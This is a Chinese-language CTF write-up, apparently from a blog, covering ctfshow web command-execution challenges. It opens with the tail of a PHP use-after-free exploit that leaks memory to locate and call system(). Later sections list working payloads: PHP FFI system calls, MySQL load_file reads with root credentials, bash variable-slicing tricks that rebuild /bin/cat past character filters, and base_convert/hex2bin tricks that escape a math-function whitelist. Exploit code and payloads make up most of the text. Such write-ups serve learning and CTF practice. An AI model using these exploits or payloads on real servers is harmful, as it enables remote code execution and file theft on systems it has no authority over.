function write(&amp;$str, $p, $v, $n = 8) {
    $i = 0;
    for($i = 0; $i &lt; $n; $i++) {
        $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));
        $v &gt;&gt;= 8;
    }
}

function leak($addr, $p = 0, $s = 8) {
    global $abc, $helper;
    write($abc, 0x68, $addr + $p - 0x10);
    $leak = strlen($helper-&gt;a);
    if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
    return $leak;
}

function parse_elf($base) {
    $e_type = leak($base, 0x10, 2);

    $e_phoff = leak($base, 0x20);
    $e_phentsize = leak($base, 0x36, 2);
    $e_phnum = leak($base, 0x38, 2);

    for($i = 0; $i &lt; $e_phnum; $i++) {
        $header = $base + $e_phoff + $i * $e_phentsize;
        $p_type  = leak($header, 0, 4);
        $p_flags = leak($header, 4, 4);
        $p_vaddr = leak($header, 0x10);
        $p_memsz = leak($header, 0x28);

        if($p_type == 1 &amp;&amp; $p_flags == 6) { 

            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
            $data_size = $p_memsz;
        } else if($p_type == 1 &amp;&amp; $p_flags == 5) { 
            $text_size = $p_memsz;
        }
    }

    if(!$data_addr || !$text_size || !$data_size)
        return false;

    return [$data_addr, $text_size, $data_size];
}

function get_basic_funcs($base, $elf) {
    list($data_addr, $text_size, $data_size) = $elf;
    for($i = 0; $i &lt; $data_size / 8; $i++) {
        $leak = leak($data_addr, $i * 8);
        if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
            $deref = leak($leak);
            
            if($deref != 0x746e6174736e6f63)
                continue;
        } else continue;

        $leak = leak($data_addr, ($i + 4) * 8);
        if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
            $deref = leak($leak);
            
            if($deref != 0x786568326e6962)
                continue;
        } else continue;

        return $data_addr + $i * 8;
    }
}

function get_binary_base($binary_leak) {
    $base = 0;
    $start = $binary_leak &amp; 0xfffffffffffff000;
    for($i = 0; $i &lt; 0x1000; $i++) {
        $addr = $start - 0x1000 * $i;
        $leak = leak($addr, 0, 7);
        if($leak == 0x10102464c457f) {
            return $addr;
        }
    }
}

function get_system($basic_funcs) {
    $addr = $basic_funcs;
    do {
        $f_entry = leak($addr);
        $f_name = leak($f_entry, 0, 6);

        if($f_name == 0x6d6574737973) {
            return leak($addr + 8);
        }
        $addr += 0x20;
    } while($f_entry != 0);
    return false;
}

function trigger_uaf($arg) {

    $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
    $vuln = new Vuln();
    $vuln-&gt;a = $arg;
}

if(stristr(PHP_OS, &#39;WIN&#39;)) {
    die(&#39;This PoC is for *nix systems only.&#39;);
}

$n_alloc = 10; 
$contiguous = [];
for($i = 0; $i &lt; $n_alloc; $i++)
    $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);

trigger_uaf(&#39;x&#39;);
$abc = $backtrace[1][&#39;args&#39;][0];

$helper = new Helper;
$helper-&gt;b = function ($x) { };

if(strlen($abc) == 79 || strlen($abc) == 0) {
    die(&quot;UAF failed&quot;);
}

$closure_handlers = str2ptr($abc, 0);
$php_heap = str2ptr($abc, 0x58);
$abc_addr = $php_heap - 0xc8;

write($abc, 0x60, 2);
write($abc, 0x70, 6);

write($abc, 0x10, $abc_addr + 0x60);
write($abc, 0x18, 0xa);

$closure_obj = str2ptr($abc, 0x20);

$binary_leak = leak($closure_handlers, 8);
if(!($base = get_binary_base($binary_leak))) {
    die(&quot;Couldn&#39;t determine binary base address&quot;);
}

if(!($elf = parse_elf($base))) {
    die(&quot;Couldn&#39;t parse ELF header&quot;);
}

if(!($basic_funcs = get_basic_funcs($base, $elf))) {
    die(&quot;Couldn&#39;t get basic_functions address&quot;);
}

if(!($zif_system = get_system($basic_funcs))) {
    die(&quot;Couldn&#39;t get zif_system address&quot;);
}


$fake_obj_offset = 0xd0;
for($i = 0; $i &lt; 0x110; $i += 8) {
    write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
}

write($abc, 0x20, $abc_addr + $fake_obj_offset);
write($abc, 0xd0 + 0x38, 1, 4); 
write($abc, 0xd0 + 0x68, $zif_system); 

($helper-&gt;b)($cmd);
exit();
}

ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush(); ?&gt;
</code></pre>
<h4 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h4><p>首先查找flag位置,然后使用文件包含得到flag</p>
<p>Payload:</p>
<blockquote>
<p>1、c&#x3D;var_export(scandir(‘&#x2F;‘));exit(0);c&#x3D;require_once(‘&#x2F;flagc.txt’);exit(0);</p>
<p>2、c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob://./*");
foreach($a as $f)
{
   echo($f->__toString().' ');
}
exit(0);
?></p>
<p>c&#x3D;include(‘flagc.txt’);exit(0);</p>
</blockquote>
<h4 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h4><p>scandir函数被ban了，使用DirectoryIterator类，flag在&#x2F;flagx.txt</p>
<p>或者使用glob协议</p>
<p>Payload:</p>
<blockquote>
<p>c&#x3D;var_export(glob(‘..&#x2F;..&#x2F;..’.’&#x2F;*’));exit(0);</p>
</blockquote>
<h4 id="web75-Sql-load-file"><a href="#web75-Sql-load-file" class="headerlink" title="web75(Sql load_file)"></a>web75(Sql load_file)</h4><p>可以查到flag位置：&#x2F;flag36.txt  但是include被ban了，之前的poc因为strlen被禁了获取不到system地址也没法用了</p>
<p>可以使用mysql的load_file函数</p>
<p>先查询数据库</p>
<pre><code class="php">c=$dsn = &quot;mysql:host=localhost;dbname=information_schema&quot;;
$db = new PDO($dsn, &#39;root&#39;, &#39;root&#39;);
$rs = $db-&gt;query(&quot;select database()&quot;);
## $rs = $db-&gt;query(&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;);
foreach($rs as $row){
        echo($row[0]).&quot;|&quot;; 
}exit();
</code></pre>
<p>查到了ctftraining的数据库，然后使用load_file读取flag</p>
<blockquote>
<pre><code class="php">c=try {$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,
&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)
{echo($row[0]).&quot;|&quot;; }$dbh = null;}catch (PDOException $e) {echo $e-
&gt;getMessage();exit(0);}exit(0);
</code></pre>
</blockquote>
<h4 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h4><p>Payload同上</p>
<h4 id="web77-FFI-php7-4以上"><a href="#web77-FFI-php7-4以上" class="headerlink" title="web77(FFI php7.4以上)"></a>web77(FFI php7.4以上)</h4><p>FFI，php7.4以上才有</p>
<p>Payload:</p>
<blockquote>
<p>$ffi &#x3D; FFI::cdef(“int system(const char *command);”);&#x2F;&#x2F;创建一个system对象<br>$a&#x3D;’&#x2F;readflag &gt; 1.txt’;   &#x2F;&#x2F;没有回显，需要重定向到文件<br>$ffi-&gt;system($a);       &#x2F;&#x2F;通过$ffi去调用system函数</p>
</blockquote>
<h4 id="web118-Bash内置变量"><a href="#web118-Bash内置变量" class="headerlink" title="web118(Bash内置变量)"></a>web118(Bash内置变量)</h4><p>看到源码有提示</p>
<pre><code class="php">&lt;!-- system($code);--&gt;
</code></pre>
<p>但几乎常规输入都被ban了</p>
<pre><code class="php">if(!preg_match(&#39;/\x09|\x0a|[a-z]|[0-9]|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\`|\||\,/&#39;, $code))
</code></pre>
<p>经过fuzz爆破了一下可以正常使用的payload只有一些大写字母和符号，可以进行bash内置变量构造</p>
<p><img src="/EZrce/web118.png"></p>
<p>一般在Linux下环境变量<code>PATH</code>一般是<code>/bin</code>，题目路径<code>PWD</code>是<code>/var/www/html</code></p>
<p>可以利用切片来得到我们需要的字母</p>
<pre><code class="shell">echo ${PWD} 
echo ${PWD:0:1}
echo ${PWD:0:3}
echo ${PWD:1:1}
echo ${PWD:2:3}

echo ${PWD:~0:1}          //从末尾开始取一个
</code></pre>
<p>但是题目过滤了数字，无法使用切片。换一种方式获取字符。</p>
<p>linux可以利用<code>~</code>获得变量的最后几位（从最后开始获取），使用取反号时，任何字母等同于数字0。</p>
<pre><code class="shell">echo ${PWD}
echo ${PWD:~0}
echo ${PWD:~1}
echo ${PWD:~2}
echo ${PWD:~j}
echo ${PWD:~J}
</code></pre>
<p>所以，<code>${PATH:~A}${PWD:~A}</code>表示的就是<code>PATH</code>的最后一个字母和<code>PWD</code>的最后一个字母，组合起来就是nl。</p>
<p><code>flag.php</code>我们可以用通配符代替<code>????.???</code></p>
<p>Payload: </p>
<blockquote>
<p>${PATH:<del>A}${PWD:</del>A} ????.???</p>
</blockquote>
<h4 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h4><p>过滤了PATH,所以想来拓展一下Bash变量</p>
<pre><code class="shell">${RANDOM}
随机的几个数

${PWD}
/var/www/html

${USER}
www-data

${HOME}
当前用户的主目录

${SHLVL}
是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。

${RANDOM}
此变量值，随机出现整数，范围为0-32767。在Linux中，${#xxx}显示的是这个值的位数不加#是变量的值，加了#是变量的值的长度。例如${#12345}的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此${#RANDOM}可以代替4或者5。

${IFS}
空格符、tab字符、换行字符(newline) 长度为3。{#IFS}=3
</code></pre>
<p><img src="/EZrce/web119.png"></p>
<p>Payload:</p>
<blockquote>
<p>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???</p>
<p>就是&#x2F;???&#x2F;?a? ????.???</p>
<p>就是&#x2F;bin&#x2F;cat flag.php</p>
</blockquote>
<blockquote>
<p>${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???</p>
<p>就是&#x2F;???&#x2F;??t ????.???</p>
<p>就是&#x2F;bin&#x2F;cat flag.php</p>
</blockquote>
<blockquote>
<p>${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???</p>
<p>就是&#x2F;???&#x2F;?????4 ????.???</p>
<p>就是&#x2F;bin&#x2F;base64 flag.php</p>
</blockquote>
<h4 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h4><p>多ban了BASH和HOME，但影响不大</p>
<p>Payload同上</p>
<h4 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h4><pre><code class="php">if(!preg_match(&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\`|\||\,/&#39;, $code))
</code></pre>
<p>没有过滤PWD,用${#?}代替1就行</p>
<p>Payload:</p>
<blockquote>
<p>${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???</p>
</blockquote>
<blockquote>
<p>${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???<br>&#x2F;bin&#x2F;rev</p>
<p>tac是cat的倒写，意思也和它是相反的。cat是从第一行显示到最后一行，而tac是从最后一行显示到第一行，而rev 则是从最后一个字符显示到第一个字符</p>
</blockquote>
<h4 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h4><pre><code class="php">if(!preg_match(&#39;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#39;|\&quot;|\`|\||\,/&#39;, $code))
</code></pre>
<p>HOME没有过滤，所以可以构造&#x2F;bin&#x2F;base64 flag.php</p>
<p>主要是找到数字1</p>
<p>我们可以利用<code>$?</code>，获取上一条命令执行结束后的返回值，<code>0</code>代表成功，<code>非0</code>代表失败。非0返回值如下：</p>
<pre><code class="shell">&quot;OS error code   1:  Operation not permitted&quot;
&quot;OS error code   2:  No such file or directory&quot;
&quot;OS error code   3:  No such process&quot;
&quot;OS error code   4:  Interrupted system call&quot;
&quot;OS error code   5:  Input/output error&quot;
&quot;OS error code   6:  No such device or address&quot;
&quot;OS error code   7:  Argument list too long&quot;
&quot;OS error code   8:  Exec format error&quot;
&quot;OS error code   9:  Bad file descriptor&quot;
&quot;OS error code  10:  No child processes&quot;
&quot;OS error code  11:  Resource temporarily unavailable&quot;
&quot;OS error code  12:  Cannot allocate memory&quot;
&quot;OS error code  13:  Permission denied&quot;
&quot;OS error code  14:  Bad address&quot;
&quot;OS error code  15:  Block device required&quot;
&quot;OS error code  16:  Device or resource busy&quot;
&quot;OS error code  17:  File exists&quot;
&quot;OS error code  18:  Invalid cross-device link&quot;
&quot;OS error code  19:  No such device&quot;
&quot;OS error code  20:  Not a directory&quot;
&quot;OS error code  21:  Is a directory&quot;
&quot;OS error code  22:  Invalid argument&quot;
&quot;OS error code  23:  Too many open files in system&quot;
&quot;OS error code  24:  Too many open files&quot;
&quot;OS error code  25:  Inappropriate ioctl for device&quot;
&quot;OS error code  26:  Text file busy&quot;
&quot;OS error code  27:  File too large&quot;
&quot;OS error code  28:  No space left on device&quot;
&quot;OS error code  29:  Illegal seek&quot;
&quot;OS error code  30:  Read-only file system&quot;
&quot;OS error code  31:  Too many links&quot;
&quot;OS error code  32:  Broken pipe&quot;
&quot;OS error code  33:  Numerical argument out of domain&quot;
&quot;OS error code  34:  Numerical result out of range&quot;
&quot;OS error code  35:  Resource deadlock avoided&quot;
&quot;OS error code  36:  File name too long&quot;
&quot;OS error code  37:  No locks available&quot;
&quot;OS error code  38:  Function not implemented&quot;
&quot;OS error code  39:  Directory not empty&quot;
&quot;OS error code  40:  Too many levels of symbolic links&quot;
&quot;OS error code  42:  No message of desired type&quot;
&quot;OS error code  43:  Identifier removed&quot;
&quot;OS error code  44:  Channel number out of range&quot;
&quot;OS error code  45:  Level 2 not synchronized&quot;
&quot;OS error code  46:  Level 3 halted&quot;
&quot;OS error code  47:  Level 3 reset&quot;
&quot;OS error code  48:  Link number out of range&quot;
&quot;OS error code  49:  Protocol driver not attached&quot;
&quot;OS error code  50:  No CSI structure available&quot;
&quot;OS error code  51:  Level 2 halted&quot;
&quot;OS error code  52:  Invalid exchange&quot;
&quot;OS error code  53:  Invalid request descriptor&quot;
&quot;OS error code  54:  Exchange full&quot;
&quot;OS error code  55:  No anode&quot;
&quot;OS error code  56:  Invalid request code&quot;
&quot;OS error code  57:  Invalid slot&quot;
&quot;OS error code  59:  Bad font file format&quot;
&quot;OS error code  60:  Device not a stream&quot;
&quot;OS error code  61:  No data available&quot;
&quot;OS error code  62:  Timer expired&quot;
&quot;OS error code  63:  Out of streams resources&quot;
&quot;OS error code  64:  Machine is not on the network&quot;
&quot;OS error code  65:  Package not installed&quot;
&quot;OS error code  66:  Object is remote&quot;
&quot;OS error code  67:  Link has been severed&quot;
&quot;OS error code  68:  Advertise error&quot;
&quot;OS error code  69:  Srmount error&quot;
&quot;OS error code  70:  Communication error on send&quot;
&quot;OS error code  71:  Protocol error&quot;
&quot;OS error code  72:  Multihop attempted&quot;
&quot;OS error code  73:  RFS specific error&quot;
&quot;OS error code  74:  Bad message&quot;
&quot;OS error code  75:  Value too large for defined data type&quot;
&quot;OS error code  76:  Name not unique on network&quot;
&quot;OS error code  77:  File descriptor in bad state&quot;
&quot;OS error code  78:  Remote address changed&quot;
&quot;OS error code  79:  Can not access a needed shared library&quot;
&quot;OS error code  80:  Accessing a corrupted shared library&quot;
&quot;OS error code  81:  .lib section in a.out corrupted&quot;
&quot;OS error code  82:  Attempting to link in too many shared libraries&quot;
&quot;OS error code  83:  Cannot exec a shared library directly&quot;
&quot;OS error code  84:  Invalid or incomplete multibyte or wide character&quot;
&quot;OS error code  85:  Interrupted system call should be restarted&quot;
&quot;OS error code  86:  Streams pipe error&quot;
&quot;OS error code  87:  Too many users&quot;
&quot;OS error code  88:  Socket operation on non-socket&quot;
&quot;OS error code  89:  Destination address required&quot;
&quot;OS error code  90:  Message too long&quot;
&quot;OS error code  91:  Protocol wrong type for socket&quot;
&quot;OS error code  92:  Protocol not available&quot;
&quot;OS error code  93:  Protocol not supported&quot;
&quot;OS error code  94:  Socket type not supported&quot;
&quot;OS error code  95:  Operation not supported&quot;
&quot;OS error code  96:  Protocol family not supported&quot;
&quot;OS error code  97:  Address family not supported by protocol&quot;
&quot;OS error code  98:  Address already in use&quot;
&quot;OS error code  99:  Cannot assign requested address&quot;
&quot;OS error code 100:  Network is down&quot;
&quot;OS error code 101:  Network is unreachable&quot;
&quot;OS error code 102:  Network dropped connection on reset&quot;
&quot;OS error code 103:  Software caused connection abort&quot;
&quot;OS error code 104:  Connection reset by peer&quot;
&quot;OS error code 105:  No buffer space available&quot;
&quot;OS error code 106:  Transport endpoint is already connected&quot;
&quot;OS error code 107:  Transport endpoint is not connected&quot;
&quot;OS error code 108:  Cannot send after transport endpoint shutdown&quot;
&quot;OS error code 109:  Too many references: cannot splice&quot;
&quot;OS error code 110:  Connection timed out&quot;
&quot;OS error code 111:  Connection refused&quot;
&quot;OS error code 112:  Host is down&quot;
&quot;OS error code 113:  No route to host&quot;
&quot;OS error code 114:  Operation already in progress&quot;
&quot;OS error code 115:  Operation now in progress&quot;
&quot;OS error code 116:  Stale NFS file handle&quot;
&quot;OS error code 117:  Structure needs cleaning&quot;
&quot;OS error code 118:  Not a XENIX named type file&quot;
&quot;OS error code 119:  No XENIX semaphores available&quot;
&quot;OS error code 120:  Is a named type file&quot;
&quot;OS error code 121:  Remote I/O error&quot;
&quot;OS error code 122:  Disk quota exceeded&quot;
&quot;OS error code 123:  No medium found&quot;
&quot;OS error code 124:  Wrong medium type&quot;
&quot;OS error code 125:  Operation canceled&quot;
&quot;OS error code 126:  Required key not available&quot;
&quot;OS error code 127:  Key has expired&quot;
&quot;OS error code 128:  Key has been revoked&quot;
&quot;OS error code 129:  Key was rejected by service&quot;
&quot;OS error code 130:  Owner died&quot;
&quot;OS error code 131:  State not recoverable&quot;
&quot;MySQL error code 132: Old database file&quot;
&quot;MySQL error code 133: No record read before update&quot;
&quot;MySQL error code 134: Record was already deleted (or record file crashed)&quot;
&quot;MySQL error code 135: No more room in record file&quot;
&quot;MySQL error code 136: No more room in index file&quot;
&quot;MySQL error code 137: No more records (read after end of file)&quot;
&quot;MySQL error code 138: Unsupported extension used for table&quot;
&quot;MySQL error code 139: Too big row&quot;
&quot;MySQL error code 140: Wrong create options&quot;
&quot;MySQL error code 141: Duplicate unique key or constraint on write or update&quot;
&quot;MySQL error code 142: Unknown character set used&quot;
&quot;MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table&quot;
&quot;MySQL error code 144: Table is crashed and last repair failed&quot;
&quot;MySQL error code 145: Table was marked as crashed and should be repaired&quot;
&quot;MySQL error code 146: Lock timed out; Retry transaction&quot;
&quot;MySQL error code 147: Lock table is full;  Restart program with a larger locktable&quot;
&quot;MySQL error code 148: Updates are not allowed under a read only transactions&quot;
&quot;MySQL error code 149: Lock deadlock; Retry transaction&quot;
&quot;MySQL error code 150: Foreign key constraint is incorrectly formed&quot;
&quot;MySQL error code 151: Cannot add a child row&quot;
&quot;MySQL error code 152: Cannot delete a parent row&quot;
</code></pre>
<p>执行<code>&lt;A</code>等命令会因找不到目录或者文件执行失败，返回值是1，<code>$?</code>获取上一条命令执行结束后的返回值就是1。我们就成功构造出了数字1。</p>
<p>Payload:</p>
<blockquote>
<p>code&#x3D;&lt;A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???</p>
<p>code&#x3D;&lt;A;${HOME:${Z}:$?}???${HOME:${Z}:$?}?????${RANDOM::$?} ????.???</p>
<p>需要多刷新</p>
</blockquote>
<h4 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h4><p>2019CISCN初赛原题</p>
<pre><code class="php+HTML"> &lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*/

error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET[&#39;c&#39;])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET[&#39;c&#39;];
    if (strlen($content) &gt;= 80) {
        die(&quot;太长了不会算&quot;);
    }
    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
    foreach ($blacklist as $blackitem) {
        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {
            die(&quot;请不要输入奇奇怪怪的字符&quot;);
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die(&quot;请不要输入奇奇怪怪的函数&quot;);
        }
    }
    //帮你算出答案
    eval(&#39;echo &#39;.$content.&#39;;&#39;);
} 
</code></pre>
<p><strong>代码审计</strong></p>
<p>代码接受GET传参<code>c</code>，保存在<code>content</code>中，并对参数长度进行了限制<code>&lt;80</code>。</p>
<p>然后设置了一个黑名单，过滤了一些特殊字符，<code>空格</code>和<code>/</code>也给过滤了，所以<code>cat /flag</code>无门。</p>
<p>接下来提供了一个白名单，里面是一些数学函数，并提供了一个常用数学函数的链接，可以查到这些函数的用法。</p>
<p>都满足以上条件后，使用<code>eval</code>来执行传入的参数。</p>
<p>分析到这里，只能利用白名单中提供的函数来构造命令，用到的函数有：</p>
<ul>
<li><code>base_convert()</code>：在任意进制之间转换数字</li>
<li><code>dechex()</code>：将十进制转换成十六进制</li>
<li><code>hex2bin()</code>：将十六进制转换成ascii字符</li>
</ul>
<p><strong>思路是：先利用<code>dechex()</code>将GET传入的十进制数转换成十六进制，再利用<code>hex2bin()</code>将得到的十六进制数转换成ascii字符串。又因为白名单里没有<code>hex2bin()</code>这个函数，所以需要利用<code>base_convert()</code>来将GET传入的十进制数转换成三十六进制（因为三十六进制中含有数字字母）构造出<code>hex2bin</code>，最后将分别传入的字符串拼接即可构造成功。</strong></p>
<p>*Trick：十进制数<code>37907361743</code>转换成三十六进制之后正好就是<code>hex2bin</code>。</p>
<p>因为代码中对传入的参数<code>c</code>做了长度限制，但可以通过传入其它参数，在构造出来的语句中调用即可。</p>
<p>这里还涉及到一个知识点，PHP中可以将函数名保存在一个变量中，然后使用这个变量来替代函数名，例如：</p>
<pre><code>$a = &#39;dechex&#39;;
echo $a(10);	// a
</code></pre>
<p>利用以上知识点，尝试构造如下payload：</p>
<pre><code>?c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat /flag
</code></pre>
<p>构造过程如下：</p>
<pre><code>base_convert(37907361743, 10, 36);		=&gt;		hex2bin
dechex(1598506324);						=&gt;		5f474554
hex2bin(&#39;5f474554&#39;);					=&gt;		_GET

($$pi){pi}(($$pi){abs}) 				=&gt; 		($_GET){pi}($_GET){abs}  //{}可以代替[]

综上：
$pi = base_convert(37907361743, 10, 36);
$pi = $pi(dechex(1598506324));
echo $pi;	// _GET，即此时的$pi就是_GET
</code></pre>
<p>拼接形成payload：</p>
<blockquote>
<p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</p>
</blockquote>
<blockquote>
<p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat flag.php</p>
<p>?c&#x3D;($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</p>
<p>?c&#x3D;base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</p>
<p>?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi{0}($pi{1})&amp;0&#x3D;system&amp;1&#x3D;cat%20flag.php</p>
<p>$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})<br>&#x2F;&#x2F;要在请求头里面加一个  1:tac flag.php  见下图</p>
</blockquote>
